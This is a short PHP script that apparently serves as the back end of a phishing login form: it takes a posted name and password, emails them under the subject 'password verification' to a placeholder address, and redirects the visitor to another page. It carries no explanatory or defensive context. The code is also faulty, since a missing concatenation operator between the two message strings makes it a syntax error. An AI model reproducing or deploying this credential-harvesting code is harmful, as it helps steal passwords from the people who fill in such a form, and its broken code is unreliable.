<?php
 if (isset($_POST['submit'])) {
    $msg =  'Name :' .$_POST['Name'] ."\n"
	         'password:' .$_POST['pwd'];
			 mail('example@example.com','password verification' ,$msg);
			 header('location: next.php');
			 }
			 else {
			 
			 exit(0);
			 }
			  ?>